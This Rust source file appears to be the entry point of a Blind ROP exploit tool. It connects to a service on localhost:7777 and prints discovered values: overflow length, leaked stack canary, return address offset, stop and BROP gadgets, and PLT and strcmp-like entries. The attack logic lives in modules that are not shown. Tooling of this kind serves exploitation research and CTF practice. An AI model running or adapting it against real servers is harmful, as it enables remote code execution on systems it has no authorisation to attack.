mod braille;
mod canary;
mod cluster;
mod gadget;
mod overflow;
mod payload;
mod plt;
mod response;
mod tube;

use crate::braille::Braille;

fn main() {
    if let Ok(mut braille) = Braille::new("localhost:7777") {
        println!(
            "overflow length: {}",
            braille.get_overflow_length().unwrap()
        );

        println!("canary value: {}", braille.get_canary_value().unwrap());

        println!(
            "return address offset: {}",
            braille.get_return_address_offset().unwrap()
        );

        println!(
            "possible return address: {}",
            braille.get_possible_return_address().unwrap()
        );

        println!("stop gadget: {}", braille.get_stop_gadget().unwrap());

        println!("padding value: {}", braille.get_padding_value().unwrap());

        println!("gadgets: \n{}", braille.get_gadgets().unwrap());

        println!("brop gadgets: \n{}", braille.get_brop_gadgets().unwrap());

        println!("plt gadgets: \n{}", braille.get_plt().unwrap());

        println!(
            "strcmp-like gadgets: \n{}",
            braille.get_strcmp_plt_items().unwrap()
        );
    }
}
